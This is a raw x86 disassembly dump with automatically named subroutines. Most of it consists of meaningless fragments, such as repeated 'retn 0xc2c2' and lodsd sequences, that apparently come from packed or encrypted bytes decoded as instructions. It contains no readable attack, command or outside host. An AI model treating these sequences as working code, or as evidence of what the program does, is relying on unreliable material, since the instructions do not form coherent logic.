sub_4646d4
rcl [ edx + 0x52 ] cl
push edx
mov ebx 0x525253ff
retn 0xadc2
sub_4646e0
add dh [ esi - 0x29 ]
xchg edx eax
pop ebp
salc
0xada2
sub_464711
retn 0xb8ba
sub_464734
retn 0xbb12
sub_464737
mov [ ebx + 0x5adadad ] eax
dec esi
cmp dl [ edx - 0x2e ]
push edx
push edx
mov ebx 0xadad9a30
retn 0xc2c2
sub_46474b
retn 0xc2c2
sub_46474e
retn 0xc2c2
sub_464751
retn 0xd8c2
sub_464754
pop ds
pop esi
ficomp [ edx - 0x45 ]
scasb [ edi ]
cmpsb [ esi ] [ edi ]
lodsd [ esi ]
lodsd [ esi ]
add al 0x4
cmp [ edx + 0x4 ] dh
add al 0x4
mov ebx 0xadadeccc
retn 0xdb34
sub_46476c
pop ds
mov esi 0xbb0a380b
push ss
stosd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_464779
retn 0xc2c2
sub_46477c
add [ ebx - 0x52527098 ] bh
retn 0xd9c2
sub_464785
xchg ebx eax
movsd [ edi ] [ esi ]
daa
inc edx
adc al 0xd7
sbb [ ebp - 0x29 ] 0xb5
push esi
push edx
push edx
mov ebx 0x5252568d
retn 0xc2c2
sub_46479a
retn 0xc2c2
sub_46479d
retn 0xc2c2
sub_4647a0
retn 0xc2c2
sub_4647a3
retn 0xc2c2
sub_4647a6
retn 0xc2c2
sub_4647a9
retn 0x8c2
sub_4647ac
cmp [ edi ] ah
xor al 0xdb
pop es
mov esi 0xac87bb08
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_4647d5
pop ss
mov [ 0x72307d72 ] al
xchg ebp eax
pop ss
cmpsb [ esi ] [ edi ]
jo r-xdata
retn 0x1679
and [ ebx - 0x52524c1f ] edi
retn 0xc2c2
sub_4647ea
retn 0xc2c2
sub_4647ed
retn 0xc2c2
sub_4647f0
retn 0xc2c2
sub_4647f3
retn 0xc2c2
sub_4647f6
retn 0xc2c2
sub_464810
daa
pop esi
mov ebx 0x525255e4
retn 0xc2c2
sub_46481a
retn 0x56da
sub_464847
add eax 0xbb0c0d02
cmp [ ebp - 0x3d3d5253 ] edi
retn 0xc2c2
sub_464855
retn 0xc2c2
sub_46485c
mov ebx 0xadaded80
retn 0xc2c2
sub_464864
retn 0xc2c2
sub_464867
retn 0xc2c2
sub_4648a8
retn 0xd9c2
sub_4648f2
mov dh 0xbb
push 0xffffff89
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_4648fb
retn 0xecd3
sub_464911
push edx
push edx
push edx
mov ebx 0xadad83a6
retn 0xadc2
sub_46491c
daa
mov dh 0xbb
lodsb [ esi ]
pop edx
push edx
push edx
retn 0x34c2
sub_464930
mov [ ebx + ebx * 8 ] esi
vmread ecx ebx
lea esi [ ebx + ebx * 8 ]
rsm
sub_46493b
or [ ebx + ebx * 8 ] esi
push gs
cmp [ ecx ] dh
sub_464943
mov [ ebx + ebx * 8 ] dh
fxrstor [ ecx ]
xor al 0xdb
shrd [ eax ] edi 0x3f
or [ ebx - 0x52525bd0 ] edi
retn 0xc2c2
sub_464958
retn 0xc2c2
sub_46495b
retn 0xc2c2
sub_46495e
retn 0xc2c2
sub_464962
dec ecx
push ecx
sbb ebx 0xe
bound ebx [ ecx + 0x34 ]
imul eax [ ebx - 0x666328a3 ] 0xfd9adad
stosb [ edi ]
pop ebp
in eax 0x17
inc edx
mov ebx 0xadad98e2
retn 0xc2c2
sub_464981
retn 0xc2c2
sub_464984
retn 0xc2c2
sub_464987
shr [ ecx - 0x138e4453 ] 0x1
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_464992
retn 0xc2c2
sub_464997
out 0x52 al
push edx
push edx
or eax 0xade9f8bb
lodsd [ esi ]
retn 0xc2c2
sub_4649a4
retn 0xc2c2
sub_4649a7
retn 0xc2c2
sub_4649cf
mov edx 0xadadb085
mov ebx 0xadadea99
retn 0xc2c2
sub_4649dc
retn 0xc2c2
sub_4649df
retn 0x3804
sub_4649e2
push cs
or bh [ eax ]
mov ebx 0xadad8642
retn 0xc2c2
sub_4649ff
retn 0xc2c2
sub_464a02
retn 0xc2c2
sub_464a05
retn 0xc2c2
sub_464a08
retn 0xdfc2
sub_464a0b
push ss
inc edx
sbb [ ebp - 0x1b ] 0x43
mov ebx 0xadad9497
retn 0xd1c2
sub_464a19
0xc2c291ad 0xc2c2
retn 0xc2c2
sub_464a23
retn 0xc2c2
sub_464a26
retn 0xd7df
sub_464a29
scasd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
add bl bh
pop ss
mov dl 0x2
mov ebx 0xadadb7ab
retn 0xd1c2
sub_464a3a
xchg esi eax
pop esi
fstp st7
mov esi 0x2adadaf
lodsd [ esi ]
add eax 0xbad7df7e
scasb [ edi ]
lodsd [ esi ]
lodsd [ esi ]
mov ebx 0xadad9ce9
retn 0xc2c2
sub_464a54
add eax 0xadaeeabb
lodsd [ esi ]
retn 0xc2c2
sub_464a5d
retn 0xc2c2
sub_464a60
retn 0xadc2
sub_464a63
daa
inc esi
fst [ edi ]
pop edx
lodsd [ esi ]
daa
inc edx
lodsd [ esi ]
daa
pop esi
mov ebx 0xadad9926
retn 0x34c2
sub_464a76
fist [ edi ]
cld
fstp [ edi + ebx * 8 - 0x5f4461e9 ]
mov cl 0xad
lodsd [ esi ]
popad
xchg edx eax
or eax 0x919b090c
retn 0xc2c2
sub_464a8d
retn 0xc2c2
sub_464a97
clflush [ ebx - 0x5252571c ]
fwait
xchg ecx eax
retn 0xc2c2
sub_464aa3
retn 0xc2c2
sub_464aa6
retn 0xdb34
sub_464aa9
pop ss
mov esi 0x9f7cbb0a
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_464ab4
retn 0xc2c2
sub_464ab7
retn 0xbed9
sub_464aba
sar [ esi + 0x525256fe ] cl
mov ebx 0x5252583b
mov edx 0xadadb043
mov ebx 0xadadbd40
retn 0x50d9
sub_464ad2
mov ebx 0x52525f49
retn 0xc2c2
sub_464ada
retn 0x34c2
sub_464add
fld [ edi ]
mov ecx ds
lodsb [ esi ]
xor al 0xdb
das
mov dl 0x61
lodsd [ esi ]
mov ebx 0x52525b0e
retn 0xc2c2
sub_464af0
fst [ edx + edi * 4 - 0x525214ad ]
or ebx ecx
sbb eax 0x5d9bd75e
salc
cmp al 0x9f
lodsd [ esi ]
lodsd [ esi ]
xlat
xchg edx eax
mov ebx 0xadad9f0b
retn 0xc2c2
sub_464b0d
retn 0x16db
sub_464b1e
push edx
push edx
push edx
fstp st5
or ecx esp
lodsd [ esi ]
lodsd [ esi ]

sub_464b2a
push edx
push edx
push edx
mov ebx 0xadadbabf
fist [ esi ]
adc ebp [ ebx + edi * 4 - 0x52527bcd ]
retn 0xc2c2
sub_464b3e
retn 0xc2c2
sub_464b41
retn 0xc2c2
sub_464b44
pop es
fnstcw [ esi + 0x385ebed1 ]
pop edx
fist [ edi ]
cmpsb [ esi ] [ edi ]
mov ebx 0xadad8c0f
retn 0xc2c2
sub_464b57
retn 0xc2c2
sub_464ba4
retn 0x1c2
sub_464bab
lodsd [ esi ]
lodsd [ esi ]
add ch [ ebp + 0x7cbb6204 ]
mov dh 0xad
lodsd [ esi ]
retn 0xc2c2
sub_464bc2
mov bh [ ebx - 0x525274cc ]
retn 0xd7c2
sub_464bcc
mov ebx 0xadadb7c8
retn 0x96d1
sub_464bd4
pop esi
xlat
xchg edx eax
pop ebp
salc
clc
0x14d9adad 0xbb02
sub_464be1
ror [ ebp + 0xbc2adad ] 0x1
fst [ ss : ebx - 0x27 ]
adc bl [ edx - 0x25 ]
pop ss
scasb [ edi ]
fst [ edi ]
scasb [ edi ]
mov ebx 0xadadbcc9
retn 0x9379
sub_464bfb
sub [ edx - 0x3d3d3d6f ] 0xffffffc2
retn 0xc2c2
sub_464c05
cmp [ edx - 0x45 ] dh
sub al 0xa0
lodsd [ esi ]
lodsd [ esi ]
fnstcw [ esi - 0x714d44fb ]
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_464c17
retn 0xc2c2
sub_464c1a
retn 0xc2c2
sub_464c1d
retn 0xc2c2
sub_464c20
retn 0xc2c2
sub_464c23
retn 0xc2c2
sub_464c26
retn 0xc2c2
sub_464c29
retn 0xc2c2
sub_464c2c
retn 0xc2c2
sub_464c2f
retn 0xc2c2
sub_464c32
rcl [ esi - 0x753f44ba ] 0x1
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_464c3d
retn 0xdb34
sub_464c74
retn 0x51c2
sub_464c95
retn 0x5638
sub_464c98
cmp dl [ edx + 0x62 ]
push edx
push edx
in eax dx
push edi
push edx
push edx
pop edx
add eax 0xad891cbb
lodsd [ esi ]
retn 0xc2c2
sub_464cab
retn 0xc2c2
sub_464cae
retn 0xc2c2
sub_464cb1
retn 0xc2c2
sub_464cf8
push edx
push edx
push edx
mov edx 0xadada441
cmp cl [ ecx ]
daa
fsub [ edx - 0x530344fb ]
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_464d0e
retn 0xc2c2
sub_464d11
retn 0xc2c2
sub_464d14
retn 0xc2c2
sub_464d17
retn 0xc2c2
sub_464d1c
loop r-xdata
retn 0xc2c2
push edx
push edx
lodsd [ esi ]
daa
mov edx 0xadbc20bb
lodsd [ esi ]
retn 0xd907
sub_464d2b
mov esi 0x5836bed3
push edx
push edx
add [ eax - 0x769e5527 ] eax
imul ebp [ ecx - 0x524f8045 ] 0xc2c2c2ad
mov ebx 0xadad947b
retn 0xadc2
sub_464d4b
and al 0x2
fist [ edi ]
cmpsb [ esi ] [ edi ]
add [ edx ] eax
mov edx 0xadadbb84
rcl [ esi - 0x79e820a2 ] 0x1
add ch [ ebp + 0xfdb0224 ]
xchg [ ebp + 0x27ada627 ] ch
scasb [ edi ]
mov ebx 0x52525622
retn 0xc2c2
sub_464d75
dec edx
fist [ edi ]
loop r-xdata
mov [ 0xffffffffc2c2adad ] al
retn 0xc2c2
mov ebx 0xadada225
retn 0xc2c2
sub_464dee
cwde
sub [ ebp - 0x3d3d3d53 ] 0xffffffc2
retn 0xd65d
sub_464df9
inc eax
test al 0xad
lodsd [ esi ]
mov ebx 0xadadec4a
retn 0xc2c2
sub_464e05
retn 0xc2c2
sub_464e08
retn 0xc2c2
sub_464e19
xchg edx eax
mov ebx 0xadada2bd
retn 0xc2c2
sub_464e22
retn 0xc2c2
sub_464e25
retn 0xc2c2
sub_464e28
retn 0xc2c2
sub_464e2b
or bh [ eax ]
and al 0xbb
sub eax 0xc2adad9f
retn 0x7038
sub_464e55
retn 0x38c2
sub_464e58
adc bh [ ebx - 0x525279e2 ]
pop ebp
salc
xchg edx eax
xchg edi eax
lodsd [ esi ]
lodsd [ esi ]
popad
xchg edx eax
fwait
xchg ecx eax
retn 0xc2c2
sub_464e6b
retn 0xc2c2
sub_464e6e
mov ebx 0xadadb276
retn 0xc2c2
sub_464e76
retn 0x71bb
sub_464e7a
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_464e7f
retn 0xc2c2
sub_464e82
retn 0xd7c2
sub_464e85
xchg edx eax
mov ebx 0xadada85e
retn 0xc2c2
sub_464eb8
retn 0xc2c2
sub_464ebb
retn 0xc2c2
sub_464ebe
retn 0xac2
sub_464ec1
cmp [ edi ] dh
or [ ebx + ebx * 8 ] esi
pop ss
mov [ 0xffffffff91d92038 ] al
mov ebx 0x52525551
retn 0xc2c2
sub_464ed4
or [ ebx + ebx * 8 ] dh
pop es
cmp [ fs : 0xffffffffbe2fdb34 ] dh
or [ ebx - 0x52521b1f ] bh
retn 0xc2c2
sub_464ee8
retn 0xdfc2
sub_464eed
mov ebx 0x52525088
retn 0xc2c2
sub_464ef5
retn 0xd75d
sub_464f30
retn 0xd75d
sub_464f33
dec ebx
sub [ ebp - 0x52ff4453 ] 0xc2c2adad
retn 0xc2c2
sub_464f41
retn 0xc2c2
sub_464f45
retn 0xc2c2
sub_464f4a
scasb [ edi ]
imul ecx [ edi ] 0xffffffae
mov ebx 0x52525afb
retn 0x5dc2
sub_464f77
retn 0xc2c2
sub_464f7a
retn 0xc2c2
sub_464f7d
retn 0xc2c2
sub_464f80
retn 0xc2c2
sub_464f83
retn 0xc2c2
sub_464f86
retn 0xc2c2
sub_464f89
retn 0xc2c2
sub_464f8c
retn 0xc2c2
sub_464f8f
retn 0xc2c2
sub_464f92
retn 0xc2c2
sub_464f95
retn 0xc2c2
sub_464f98
retn 0xc2c2
sub_464f9b
retn 0xc2c2
sub_464f9e
retn 0xc2c2
sub_464fa1
retn 0xc2c2
sub_464fa4
retn 0xc2c2
sub_464fa7
retn 0xc2c2
sub_464faa
retn 0xc2c2
sub_464fad
retn 0xc2c2
sub_464fb0
retn 0xc2c2
sub_464fb3
retn 0xc2c2
sub_464fb6
retn 0xc2c2
sub_464fb9
retn 0xc2c2
sub_464fbc
retn 0xac2
sub_464fbf
cmp [ 0xffffffffad853cbb ] bh
lodsd [ esi ]
retn 0xc2c2
sub_464fc9
retn 0xc2c2
sub_464fcc
retn 0x17d9
sub_464fcf
pop edx
lodsd [ esi ]
add dh [ esi ]
popad
fwait
shr [ edx - 0x6c38a253 ] 0x1
mov ebx 0xadad9c96
retn 0xaad1
sub_464fe3
push ebx
pop ebp
salc
push esp
mov [ 0xffffffffdfdfadad ] eax
0xdfadadaf 0xfed7
movsb [ edi ] [ esi ]
lodsd [ esi ]
lodsd [ esi ]
mov edx 0xadad90b6
mov ebx 0x52525411
retn 0x96ba
sub_465003
test eax 0xb1bbadad
mov [ 0xffffffffd7c2adad ] eax
movsb [ edi ] [ esi ]
pop ebp
salc
mov dh 0x56
push edx
push edx
mov ebx 0xadad8456
retn 0xc2c2
sub_46501c
retn 0xc2c2
sub_46501f
retn 0xc2c2
sub_465022
retn 0xc2c2
sub_465027
xor al 0x69
mov eax [ 0xffffffffadebd9bb ]
lodsd [ esi ]
retn 0xc2c2
sub_465032
retn 0xc2c2
sub_465035
retn 0x17d9
sub_465038
pop edx
mov ebx 0xadad84c0
retn 0xc2c2
sub_465041
retn 0xc2c2
sub_465044
retn 0xdbc2
sub_465047
push ebx
add [ ebx - 0x52526988 ] edi
retn 0xc2c2
sub_465051
retn 0xc2c2
sub_465055
xchg ecx eax
retn 0xc2c2
sub_465059
retn 0xc2c2
sub_46505c
retn 0xc2c2
sub_46505f
retn 0x9aba
sub_46508b
lodsd [ esi ]
lodsd [ esi ]
mov ebx 0xadadbd64
fst [ edx ]
pop esi
mov ebx 0xadad8991
retn 0xc2c2
sub_46509d
retn 0xc2c2
sub_4650a0
retn 0xdb34
sub_4650a3
pop esi
inc esp
rcl [ eax - 0x69ef44b0 ] 0x1
lodsd [ esi ]
lodsd [ esi ]
retn 0xd05d
sub_4650b9
push edx
push edx
push edx
fstp st7
stosb [ edi ]
scasd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
mov edx 0xadade625
mov ebx 0xadad999e
retn 0x61c2
sub_4650cf
xchg edx eax
adc bh [ ebx - 0x52524b04 ]
retn 0xd65d
sub_4650d9
lds esp [ edi + 0x6dbbadad ]
mov dl 0xad
lodsd [ esi ]
retn 0xbc2
sub_4650e5
mov ebx 0xadadaca5
retn 0x7c2
sub_4650ed
mov ebx 0xadad99df
retn 0xc2c2
sub_4650f5
retn 0xc2c2
sub_4650f8
retn 0xc2c2
sub_4650fb
retn 0xc2c2
sub_4650fe
retn 0xc2c2
sub_465101
retn 0xadc2
sub_465104
daa
mov [ 0x59a0fdb ] al
mov ebx 0xadad9004
retn 0xc2c2
sub_465112
xlat
fwait
mov ebx 0x52525681
retn 0xc2c2
sub_46511c
retn 0x34c2
sub_46513b
retn 0xc2c2
sub_46513e
lodsd [ esi ]
add al 0x16
fst [ edi ]
scasb [ edi ]
fstp [ edi ]
pop esi
mov ebx 0xadadaca8
retn 0xc2c2
sub_46514f
retn 0xc2c2
sub_465152
retn 0xfdb
sub_465155
scasb [ edi ]
fistp [ edi ]
cmpsb [ esi ] [ edi ]
mov ebx 0xadad95d2
retn 0xc2c2
sub_465161
retn 0xc2c2
sub_465164
push ecx
pop ss
scasb [ edi ]
add edi [ ebx - 0x52525f0b ]
retn 0x919b
sub_465170
retn 0xc2c2
sub_465173
retn 0xc2c2
sub_465176
mov ebx 0xadadadc5
retn 0xc2c2
sub_46517e
retn 0x38c2
sub_465181
cmp al 0xbb
and eax 0xc2adadbf
popad
xchg edx eax
adc bl [ ebx - 0x3d3d3d6f ]
retn 0xc2c2
sub_465193
pop ebp
xlat
xchg esp eax
stosd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
fst [ edi ]
pop edx
setno dl
retn 0xc2c2
sub_4651a2
retn 0xc2c2
sub_4651a5
retn 0xc2c2
sub_4651a8
retn 0xc2c2
sub_4651ab
retn 0x38c2
sub_4651ae
xor [ ebx - 0x52526932 ] bh
retn 0x17df
sub_4651c2
ficom [ edx + 0x52 ]
push edx
mov ebx 0xadad9d31
retn 0xffba
sub_4651ce
out dx eax
lodsd [ esi ]
lodsd [ esi ]
fist [ edi ]
lodsd [ esi ]
mov ebx 0xadade7af
retn 0xc2c2
sub_4651dc
retn 0xc2c2
sub_4651df
lodsd [ esi ]
daa
mov dh 0xbb
push es
cmpsd [ esi ] [ edi ]
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_4651ea
retn 0x7eba
sub_46522d
pop ss
scasb [ edi ]
mov ebx 0xadada74d
retn 0xc2c2
sub_465237
retn 0x53fa
sub_465285
retn 0x5dc2
sub_465288
fcom [ ecx + 0x52 ]
push edx
push edx
popad
xchg edx eax
adc dl [ ecx - 0x3d3d3d3e ]
retn 0xc2c2
sub_465298
retn 0xc2c2
sub_46529b
retn 0xc2c2
sub_46529e
retn 0xc2c2
sub_4652a1
retn 0x2c2
sub_4652a4
mov ebx 0xadade1af
xor al 0xdb
pop es
push cs
mov ebx 0xadadfd26
retn 0xc2c2
sub_4652b5
retn 0xd8c2
sub_4652b8
pop edx
mov ebx 0xadada625
retn 0xc2c2
sub_4652c1
retn 0x34c2
sub_4652df
lodsd [ esi ]
pop ds
pop esi
mov ebx 0x525253ae
retn 0x9c2
sub_4652eb
xchg ecx eax
retn 0xc2c2
sub_4652ef
retn 0xbac2
sub_465302
pop ss
mov dh 0xda
pop ss
xchg esi eax
ficom [ edi ]
xchg bh bl
pop ds
mov edx 0x95fa17df
pop ss
mov edx 0x191f0419
mov ebx 0xadad81ef
retn 0xc2c2
sub_465362
push edx
lodsd [ esi ]
vrsqrtss xmm2 xmm0 [ edx + 0x52 ]
or eax 0xc2c2c291
retn 0xc2c2
sub_465371
retn 0xc2c2
sub_465374
retn 0xd3c2
sub_465377
xchg ebp eax
cwde
push edx
push edx
push edx
mov ebx 0xadada342
retn 0xc2c2
sub_465384
retn 0xc2c2
sub_465387
pop es
fnstcw [ esi - 0x51c82efd ]
push edx
cmp [ edx - 0x45 ] ah
add ch [ edx - 0x3d3d5253 ]
retn 0xc2c2
sub_46539b
retn 0xc2c2
sub_46539e
retn 0xc2c2
sub_4653a1
retn 0x23ad
sub_4653a4
scasb [ edi ]
mov ebx 0xadadba46
retn 0xadc2
sub_465406
retn 0xc2c2
sub_465409
retn 0xc2c2
sub_46540c
retn 0xc2c2
sub_46540f
retn 0xc2c2
sub_465412
retn 0xc2c2
sub_465415
retn 0xc2c2
sub_465418
retn 0x523a
sub_46541b
push edx
push edx
pop edx
mov ebx 0xadada866
retn 0xc2c2
sub_465426
mov edx 0xadadb55f
xlat
xchg edx eax
pop ebp
xlat
xchg ebx eax
lodsd [ esi ]
lodsd [ esi ]
mov ebx 0xadadbe97
retn 0xc2c2
sub_46543b
retn 0xc2c2
sub_46543e
xor al 0xdb
pop ss
sahf
mov ebx 0xadada925
retn 0x34c2
sub_46544a
fld [ edi ]
mov al 0xd
xor al 0xdb
das
mov edx 0x340d3f38
fld [ edi ]
mov eax 0xadb8c2bb
lodsd [ esi ]
retn 0xc2c2
sub_465461
retn 0xc2c2
sub_465464
retn 0xc2c2
sub_465467
retn 0xc2c2
sub_465485
rcl [ edx + 0x52 ] cl
push edx
fcmovnbe st4
xchg edx eax
push edx
push edx
push edx
imul edx [ ecx - 0x52489645 ] 0xc2c2c2ad
retn 0xd9c2
sub_46549c
pop ss
pop edx
mov ebx 0xadadb1a4
retn 0xbac2
sub_4654f5
lodsd [ esi ]
lodsd [ esi ]
or eax 0xc2c2910c
retn 0xc2c2
sub_4654ff
retn 0xc2c2
sub_465502
retn 0xd65d
sub_46552a
retn 0xc2c2
sub_46552d
retn 0x504
sub_465553
retn 0xc2c2
sub_465556
retn 0xc2c2
sub_465559
retn 0xeda
sub_46557f
retn 0xc2c2
sub_465582
retn 0xc2c2
sub_465585
retn 0x34c2
sub_465588
shr [ ebx + 0x72 ] 0x1
mov ebx 0xadada915
retn 0x34c2
sub_465593
fld [ edi ]
mov [ 0xffffffffadb5f9bb ] al
lodsd [ esi ]
retn 0xcfba
sub_46559e
std
lodsd [ esi ]
lodsd [ esi ]
fild [ edi ]
cmpsb [ esi ] [ edi ]
mov edx 0xadadb7dd
mov ebx 0xadade838
retn 0xc2c2
sub_4655b1
pop ebp
salc
fisttp [ ebx + 0xbeaadad ]
add dl [ edx + 0x52 ]
xor al 0xdb
adc al 0x5a
mov ebx 0xadade666
retn 0xc2c2
sub_4655c8
retn 0xc2c2
sub_4655cb
retn 0xc2c2
sub_4655ce
retn 0xc2c2
sub_4655d1
retn 0xc2c2
sub_4655d4
xor al 0xdb
pop ss
mov al [ 0xc21380a ]
xor al 0xdb
pop ss
cmpsb [ esi ] [ edi ]
mov ebx 0xadadef23
retn 0xc2c2
sub_4655e8
retn 0xc2c2
sub_4655eb
retn 0xbcbb
sub_4655ee
mov edx 0xc2c2adad
retn 0xc2c2
sub_46562e
retn 0xc2c2
sub_465631
add al 0x5
add ah ch
cmc
xchg esp eax
xor eax 0x9918bb1c
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_465641
retn 0xd9c2
sub_465644
0xadef7cbb 0xc2ad
retn 0x1795
sub_465694
mov dl 0xad
lodsd [ esi ]
retn 0x95c2
sub_4656d1
retn 0xc2c2
sub_4656d4
retn 0xc2c2
sub_4656d7
retn 0xc2c2
sub_4656da
retn 0xc2c2
sub_4656dd
retn 0xa379
sub_4656e0
salc
cmp [ ebx - 0x52521e0b ] 0xc2
xor al 0xdb
das
0xdb34ad61 0x982f
mov ebx 0xadadb809
retn 0xc2c2
sub_4656fa
retn 0xc2c2
sub_4656fd
retn 0xc2c2
sub_465700
retn 0xc2c2
sub_465703
retn 0xdbc2
sub_465706
pop ss
stosb [ edi ]
mov ebx 0x5252525e
retn 0xc2c2
sub_465710
retn 0xc2c2
sub_465713
retn 0xc2c2
sub_465716
fst [ edi ]
stosb [ edi ]
fistp [ edi ]
mov dl 0xbb
mov bh 0xad
lodsd [ esi ]
shr [ edi ] cl
inc edx
push ebx
mov ebx 0x5252521b
retn 0xc2c2
sub_46572d
retn 0xc2c2
sub_465730
retn 0xc2c2
sub_465733
retn 0xc2c2
sub_465736
retn 0xaad9
sub_465739
cmp [ esi ] dh
add eax 0xade4e3bb
lodsd [ esi ]
popad
xchg edx eax
adc bh [ ebx - 0x52520098 ]
retn 0xc2c2
sub_46574c
retn 0xc2c2
sub_46574f
retn 0xc2c2
sub_465752
retn 0x96d1
sub_465755
pop esi
add [ eax ] edi
push eax
lodsd [ esi ]
add eax 0xd18ad95e
test eax 0x9e66bbad
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_465769
retn 0xc2c2
sub_46576c
retn 0xc2c2
sub_46576f
retn 0xc2c2
sub_465772
retn 0xd75d
sub_465775
aad 0xb6
lodsd [ esi ]
lodsd [ esi ]
add edi ebx
xlat
0x2adadaf 0xd7df
out 0xaa al
lodsd [ esi ]
lodsd [ esi ]
mov ebx 0xadad9242
retn 0xc2c2
sub_46578f
retn 0xc2c2
sub_465792
retn 0xc2c2
sub_465795
adc eax 0x52fec4ad
push edx
push edx
fist [ edi ]
push ss
add bl cl
xchg esp eax
mov edx 0xadadfe03
mov ebx 0xadad832f
retn 0x7c2
sub_4657af
mov ebx 0xadada60a
retn 0xc2c2
sub_4657b7
retn 0xc2c2
sub_4657ba
retn 0xc2c2
sub_4657bd
retn 0xc2c2
sub_4657d8
0xbb525252 0xf908
sub_4657df
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_4657e4
retn 0xc2c2
sub_4657e7
or [ ebx - 0x3d3d3d6f ] ebx
retn 0xc2c2
sub_4657f0
retn 0x79c2
sub_4657f3
push ebx
xchg ecx eax
retn 0xc2c2
sub_4657f8
retn 0xc2c2
sub_4657fb
retn 0xd65d
sub_465801
lodsd [ esi ]
mov ebx 0xadad8baf
lodsd [ esi ]
add eax 0x8ae7bb4e
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_465812
retn 0xc2c2
sub_465815
retn 0xc2c2
sub_465818
retn 0x17d9
sub_46581c
push ecx
pop ds
scasb [ edi ]
add bh [ ebx - 0x52525959 ]
retn 0xc2c2
sub_46583c
retn 0xc2c2
sub_46583f
xchg ebp eax
pop ss
cmpsb [ esi ] [ edi ]
and [ eax ] esi
cmp esi [ edi ]
mov ebx 0xadad8893
retn 0xc2c2
sub_46584e
retn 0x34c2
sub_465877
mov ebx 0xadad96dc
retn 0xc2c2
j_sub_403858#2
jmp sub_403858
sub_465944
pop ebp
retn
sub_465b1e
retn
j_sub_403858
jmp sub_403858
j_sub_465b1e
jmp sub_465b1e
sub_465b26
pop ebp
retn
sub_465d36
inc ebp
add [ eax ] cl
in al dx
inc ebp
add al bl
jmp sub_465d84
